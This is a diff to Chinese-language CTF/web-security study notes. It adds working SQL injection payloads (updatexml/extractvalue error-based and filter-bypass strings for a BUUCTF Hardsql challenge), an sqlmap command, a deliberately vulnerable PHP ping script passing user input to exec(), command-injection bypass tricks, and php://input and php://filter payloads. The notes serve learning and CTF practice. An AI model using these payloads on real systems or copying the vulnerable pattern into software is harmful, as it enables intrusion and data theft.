@@ -82,7 +82,7 @@ table_schema:表名称字段
 5：查询数据库下的表名：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' #`  
 6:查询表下的列名字段:`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' #`  
 7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名 #` 
-#### 报错注入：
+#### 报错注入：（如果and被过滤了试试^）
 mysql5.1.5 开始，提供两个 XML 查询和修改的函数：extractvalue 和 updatexml。extractvalue 负责在 xml 文档中按照 xpath 语法查询节点内容，updatexml 则负责修改查询到的内容。
 用法上extractvalue与updatexml的区别：updatexml使用三个参数，extractvalue只有两个参数。还有一种就是floor实现的group by主键重复
 extractvalue注入步骤(整数型)：  
@@ -105,6 +105,14 @@ floor注入步骤(仅参考):
 `1 union select count(*), concat((select column_name from information_schema.columns where table_name='表名' limit 0,1), floor(rand(0)*2)) x from news group by x`  
 
 `1 union select count(*), concat((select 字段名 from 表名 limit 0,1), floor(rand(0)*2)) x from news group by x`  
+真题演练：BUUCTF-Hardsql(过滤了union，and,空格,等号)
+`1'^updatexml(1,concat(0x7e,(database()),0x7e),1)#`
+
+`/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))#`  
+
+`1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))#`  
+
+`extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))`  
 #### 布尔型注入：
 常见函数：length():返回字符串的长度  
 substr():截取字符串  
@@ -493,7 +501,7 @@ sqlmap.py  -u  http://192.168.1.xxx/sql1/less-1/?id=1 --dbs
 如果还需要在爆出来的指定数据库查询数据，则需要将上一条命令中的 --dbs 缩写成 -D xxx （意思是在xxx数据库中继续查询数据）  
 
 4)获取数据库中的表名  
-sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye --table  
+sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye --tables 
 注：将上一条命令中的--table缩写成-T时，表示在某表中继续查询  
 若在该命令中不加-D参数来指定具体的数据库，那么sqlmap会把数据库中所有表列出  
 
@@ -601,10 +609,11 @@ if __name__ == '__main__':
         t.join()
 
 ```
-### XSS：
-反射型：
-存储型：
-DOM型：
+### XSS：跨站脚本攻击，攻击者往web页面插入恶意的JavaScript代码
+#### 反射型：非持久性XSS
+#### 存储型：攻击数据存储在目标服务器的数据库中
+#### DOM型：使用DOM动态访问更新文档的内容，结构，样式。HTML标签都是节点，节点组成了节点树。通过HTML DOM可以对树上所有节点进行修改。服务器响应不会处理XSS代码，而是用户浏览器处理这个响应时，DOM对象会处理XSS代码，触发XSS漏洞
+
 ### SSRF：
 内网访问：
 伪协议读取文件：
@@ -620,14 +629,34 @@ url：
 DNS重绑定：
 ### 远程命令执行RCE：
 eval执行：
+PHP代码执行函数：  
+eval(字符串作为PHP代码执行)、assert(接受一个字符串作为参数，将其作为PHP代码执行)、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等  
+PHP命令执行函数：  
+system(执行外部程序并显示输出)、exec(执行外部程序，返回最后一行输出)、shell_exec(执行外部程序并且将结果作为字符串返回)、pcntl_exec()、popen()、proc_popen()、passthru()、等  
+绕过方式：https://zhuanlan.zhihu.com/p/391439312
 #### 文件包含
 本地文件包含：
 远程文件包含：
 #### 命令注入：
-过滤cat
-过滤空格
-目录分割分隔符
-过滤运算符：
+无过滤:常见内部函数
+```php
+<?php
+
+$res = FALSE;
+
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $cmd = "ping -c 4 {$_GET['ip']}";
+    exec($cmd, $res);
+}
+
+?>
+```
+此时只需要用;闭合前面的再输入我们的命令即可。例如172.0.0.1;cat flag 
+过滤cat：可以用more来代替，详情见上面链接  https://zhuanlan.zhihu.com/p/391439312  
+过滤空格：在url中可用%09来代替，详情见上面链接  
+目录分割分隔符：先cd进入，再cat  
+过滤运算符：&，；，|，||,%0A等均可
 #### 为协议篇：
-php
-子主题2
+file=php://input提供一个输入流，可以读取到POST的数据并作为PHP代码执行。例如传入url?file=php://input，再post提交一个数据`<?php system('ls /'); ?>`  
+php:file=php://filter/convert.base64-encode/resource=flag.php  
+嵌套使用:?category=php://filter/read=convert.base64-encode/woofers/resource=flag  
